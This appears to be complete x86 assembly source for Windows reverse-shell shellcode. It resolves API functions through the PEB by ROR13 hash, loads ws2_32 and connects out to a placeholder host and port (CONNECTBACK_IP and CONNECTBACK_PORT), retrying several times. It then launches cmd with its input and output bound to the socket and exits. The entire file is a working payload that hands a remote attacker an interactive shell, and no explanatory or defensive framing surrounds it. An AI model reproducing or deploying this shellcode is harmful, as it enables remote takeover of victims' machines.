global _start
_start:
	cld
	call main
	pusha
	mov ebp,esp
	xor eax,eax
	mov edx,DWORD  [fs:eax+0x30]
	mov edx,DWORD  [edx+0xc]
	mov edx,DWORD  [edx+0x14]
place1:
	mov esi,DWORD  [edx+0x28]
	movzx ecx,WORD  [edx+0x26]
	xor edi,edi
loop1:
	lodsb
	cmp al,0x61
	jl place2
	sub al,0x20
place2:
	ror edi,0xd
	add edi,eax
	loop loop1
	push edx
	push edi
	mov edx,DWORD  [edx+0x10]
	mov ecx,DWORD  [edx+0x3c]
	mov ecx,DWORD  [ecx+edx*1+0x78]
	jecxz place6
	add ecx,edx
	push ecx
	mov ebx,DWORD  [ecx+0x20]
	add ebx,edx
	mov ecx,DWORD  [ecx+0x18]
place3:
	jecxz place5
	dec ecx
	mov esi,DWORD  [ebx+ecx*4]
	add esi,edx
	xor edi,edi
place4:
	lodsb
	ror edi,0xd
	add edi,eax
	cmp al,ah
	jne place4
	add edi,DWORD  [ebp-0x8]
	cmp edi,DWORD  [ebp+0x24]
	jne place3
	pop eax
	mov ebx,DWORD  [eax+0x24]
	add ebx,edx
	mov cx,WORD  [ebx+ecx*2]
	mov ebx,DWORD  [eax+0x1c]
	add ebx,edx
	mov eax,DWORD  [ebx+ecx*4]
	add eax,edx
	mov DWORD  [esp+0x24],eax
	pop ebx
	pop ebx
	popa
	pop ecx
	pop edx
	push ecx
	jmp eax
place5:
	pop edi
place6:
	pop edi
	pop edx
	mov edx,DWORD  [edx]
	jmp place1
main:
	pop ebp
	push 0x3233
	push 0x5f327377
	push esp
	push 0x726774c
	call ebp
	mov eax,0x190
	sub esp,eax
	push esp
	push eax
	push 0x6b8029
	call ebp
	push eax
	push eax
	push eax
	push eax
	inc eax
	push eax
	inc eax
	push eax
	push 0xe0df0fea
	call ebp
	xchg edi,eax
	push 0x5
	push 0xCONNECTBACK_IP    ;host
	push 0xCONNECTBACK_PORT0002   ; port
	mov esi,esp
place7:
	push 0x10
	push esi
	push edi
	push 0x6174a599
	call ebp
	test eax,eax
	je place8
	dec DWORD  [esi+0x8]
	jne place7
	push 0x56a2b5f0
	call ebp
place8:
	push 0x646d63
	mov ebx,esp
	push edi
	push edi
	push edi
	xor esi,esi
	push 0x12
	pop ecx
loop2:
	push esi
	loop loop2
	mov WORD  [esp+0x3c],0x101
	lea eax,[esp+0x10]
	mov BYTE  [eax],0x44
	push esp
	push eax
	push esi
	push esi
	push esi
	inc esi
	push esi
	dec esi
	push esi
	push esi
	push ebx
	push esi
	push 0x863fcc79
	call ebp
	mov eax,esp
	dec esi
	push esi
	inc esi
	push DWORD  [eax]
	push 0x601d8708
	call ebp
	mov ebx,0x56a2b5f0
	push 0x9dbd95a6
	call ebp
	cmp al,0x6
	jl place9
	cmp bl,0xe0
	jne place9
	mov ebx,0x6f721347
place9:
	push 0x0
	push ebx
	call ebp